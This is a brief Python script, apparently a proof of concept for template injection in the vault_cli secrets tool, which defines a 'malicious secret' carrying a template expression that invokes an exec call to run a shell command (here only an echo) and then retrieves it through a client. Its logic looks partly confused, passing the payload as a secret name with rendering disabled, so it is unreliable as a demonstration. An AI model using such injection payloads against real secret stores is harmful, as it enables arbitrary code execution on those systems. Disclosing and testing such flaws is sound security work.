import vault_cli

# Malicious secret crafted by an attacker
malicious_secret = "!template! {{ config['exec']('echo Malicious Code Executed') }}"

# Simulating the attack
def simulate_attack():
    # Create a client that does not allow template rendering (injectable version)
    client = vault_cli.get_client(render=False)

    # The attacker retrieves the malicious secret
    rendered_secret = client.get_secret(malicious_secret)

    # The rendered secret executes the malicious command
    print(rendered_secret)

# Execute the simulated attack
simulate_attack()